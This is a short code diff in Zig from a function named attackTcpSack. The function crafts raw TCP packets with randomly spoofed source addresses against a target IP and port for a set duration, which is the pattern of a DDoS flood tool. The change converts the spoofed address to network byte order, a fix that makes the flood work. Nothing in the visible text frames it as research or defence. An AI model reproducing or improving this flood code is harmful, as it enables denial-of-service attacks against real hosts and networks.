@@ -80,7 +80,7 @@ pub fn attackTcpSack(ip: u32, port: u16, duration: u32) void {
         iph.frag_off = 0;
         iph.ttl = 255;
         iph.protocol = IPPROTO_TCP;
-        iph.saddr = rng.next(); // Random spoofed source
+        iph.saddr = std.mem.nativeToBig(u32, rng.next()); // Random spoofed source
         iph.daddr = ip;
         iph.check = 0;
         iph.check = crypto.internetChecksum(packet[0..20]);
